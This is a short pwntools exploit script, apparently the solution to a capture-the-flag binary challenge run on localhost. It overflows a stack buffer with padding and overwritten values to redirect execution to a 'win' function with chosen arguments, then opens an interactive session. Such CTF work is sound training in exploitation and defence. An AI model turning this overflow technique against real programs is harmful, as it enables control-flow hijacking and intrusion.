from pwn import *

exe = ELF("../challenge/chall")
context.binary = exe

if args.REMOTE:
    io = remote('localhost', 1337)
else:
    io = process(exe.path)
#io = gdb.debug(exe.path)
payload = 32*b"A"

payload += p32(0x1f4)
payload += p32(0x190)

payload += 4*b'B'+4*b'C'+4*b'D'

payload += p32(exe.symbols['win'])
payload += 4*b'E'
payload += p32(0xdeadbeef)
payload += p32(0x1337)

io.recv()
io.sendline(payload)
io.interactive()



